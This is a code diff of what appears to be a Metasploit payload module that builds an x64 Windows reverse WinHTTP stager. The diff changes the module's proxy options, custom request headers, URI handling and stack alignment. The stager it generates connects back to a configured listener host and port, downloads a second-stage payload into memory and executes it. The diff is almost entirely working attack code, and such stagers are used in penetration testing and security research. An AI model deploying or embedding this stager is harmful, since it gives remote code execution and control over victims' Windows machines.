@@ -22,7 +22,7 @@ module Payload::Windows::ReverseWinHttp_x64
   def initialize(*args)
     super
     register_advanced_options([
-        OptBool.new('PayloadProxyIE', [false, 'Enable use of IE proxy settings', true])
+        OptBool.new('HttpProxyIE', 'Enable use of IE proxy settings', default: true, aliases: ['PayloadProxyIE'])
       ], self.class)
   end
 
@@ -30,27 +30,29 @@ module Payload::Windows::ReverseWinHttp_x64
   # Generate the first stage
   #
   def generate(opts={})
+    ds = opts[:datastore] || datastore
     conf = {
-      ssl:         opts[:ssl] || false,
-      host:        datastore['LHOST'] || '127.127.127.127',
-      port:        datastore['LPORT']
+      ssl:  opts[:ssl] || false,
+      host: ds['LHOST'] || '127.127.127.127',
+      port: ds['LPORT']
     }
 
     # Add extra options if we have enough space
-    if self.available_space && required_space <= self.available_space
-      conf[:uri]              = generate_uri
-      conf[:exitfunk]         = datastore['EXITFUNC']
+    if self.available_space.nil? || required_space <= self.available_space
+      conf[:uri]              = luri + generate_uri
+      conf[:exitfunk]         = ds['EXITFUNC']
       conf[:verify_cert_hash] = opts[:verify_cert_hash]
-      conf[:proxy_host]       = datastore['PayloadProxyHost']
-      conf[:proxy_port]       = datastore['PayloadProxyPort']
-      conf[:proxy_user]       = datastore['PayloadProxyUser']
-      conf[:proxy_pass]       = datastore['PayloadProxyPass']
-      conf[:proxy_type]       = datastore['PayloadProxyType']
-      conf[:retry_count]      = datastore['StagerRetryCount']
-      conf[:proxy_ie]         = datastore['PayloadProxyIE']
+      conf[:proxy_host]       = ds['HttpProxyHost']
+      conf[:proxy_port]       = ds['HttpProxyPort']
+      conf[:proxy_user]       = ds['HttpProxyUser']
+      conf[:proxy_pass]       = ds['HttpProxyPass']
+      conf[:proxy_type]       = ds['HttpProxyType']
+      conf[:retry_count]      = ds['StagerRetryCount']
+      conf[:proxy_ie]         = ds['HttpProxyIE']
+      conf[:custom_headers]   = get_custom_headers(ds)
     else
       # Otherwise default to small URIs
-      conf[:uri]              = generate_small_uri
+      conf[:uri]              = luri + generate_small_uri
     end
 
     generate_reverse_winhttp(conf)
@@ -95,6 +97,9 @@ module Payload::Windows::ReverseWinHttp_x64
     # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
     space += 31
 
+    # Custom headers? Ugh, impossible to tell
+    space += 512
+
     # The final estimated size
     space
   end
@@ -115,12 +120,18 @@ module Payload::Windows::ReverseWinHttp_x64
   # Generate an assembly stub with the configured feature set and options.
   #
   # @option opts [Bool] :ssl Whether or not to enable SSL
-  # @option opts [String] :uri The URI to request during staging
+  # @option opts [String] :url The URI to request during staging
   # @option opts [String] :host The host to connect to
-  # @option opts [Fixnum] :port The port to connect to
-  # @option opts [String] :verify_cert_hash A 20-byte raw SHA-1 hash of the certificate to verify, or nil
+  # @option opts [Integer] :port The port to connect to
   # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
-  # @option opts [Fixnum] :retry_count The number of times to retry a failed request before giving up
+  # @option opts [String] :proxy_host The optional proxy server host to use
+  # @option opts [Integer] :proxy_port The optional proxy server port to use
+  # @option opts [String] :proxy_type The optional proxy server type, one of HTTP or SOCKS
+  # @option opts [String] :proxy_user The optional proxy server username
+  # @option opts [String] :proxy_pass The optional proxy server password
+  # @option opts [String] :custom_headers The optional collection of custom headers for the payload.
+  # @option opts [Integer] :retry_count The number of times to retry a failed request before giving up
+  # @option opts [Integer] :retry_wait The seconds to wait before retry a new request
   #
   def asm_reverse_winhttp(opts={})
 
@@ -141,7 +152,7 @@ module Payload::Windows::ReverseWinHttp_x64
     full_url << opts[:uri]
 
     encoded_full_url = asm_generate_wchar_array(full_url)
-    encoded_uri_index = full_url.rindex('/') * 2
+    encoded_uri_index = (full_url.length - opts[:uri].length) * 2
 
     if opts[:ssl] && opts[:verify_cert_hash]
       verify_ssl = true
@@ -168,6 +179,8 @@ module Payload::Windows::ReverseWinHttp_x64
 
     proxy_user = opts[:proxy_user].to_s.length == 0 ? nil : asm_generate_wchar_array(opts[:proxy_user])
     proxy_pass = opts[:proxy_pass].to_s.length == 0 ? nil : asm_generate_wchar_array(opts[:proxy_pass])
+
+    custom_headers = opts[:custom_headers].to_s.length == 0 ? nil : asm_generate_wchar_array(opts[:custom_headers])
 
     http_open_flags = 0x00000100 # WINHTTP_FLAG_BYPASS_PROXY_CACHE
     secure_flags = (
@@ -431,15 +444,29 @@ module Payload::Windows::ReverseWinHttp_x64
         pop r9                        ; dwBufferLength (4 = size of flags)
         mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSetOption')} ; WinHttpSetOption
         call rbp
+
+        xor r8, r8                    ; dwHeadersLen (0)
       ^
     end
 
-    asm << %Q^
-      winhttpsendrequest:
-        mov rcx, rsi                  ; hRequest (request handle)
+    if custom_headers
+      asm << %Q^
+        call get_req_headers          ; lpszHeaders (pointer to the custom headers)
+        db #{custom_headers}
+      get_req_headers:
+        pop rdx                       ; lpszHeaders
+        dec r8                        ; dwHeadersLength (assume NULL terminated)
+      ^
+    else
+      asm << %Q^
         push rbx
         pop rdx                       ; lpszHeaders (NULL)
-        xor r8, r8                    ; dwHeadersLen (0)
+      ^
+    end
+
+
+    asm << %Q^
+        mov rcx, rsi                  ; hRequest (request handle)
         xor r9, r9                    ; lpszVersion (NULL)
         push rbx                      ; stack alignment
         push rbx                      ; dwContext (0)
@@ -575,7 +602,6 @@ module Payload::Windows::ReverseWinHttp_x64
         test eax, eax                 ; are we done?
         jnz download_more             ; keep going
         pop rax                       ; clear up reserved space
-        pop rax                       ; realign again
 
       execute_stage:
         ret                           ; return to the stored stage address
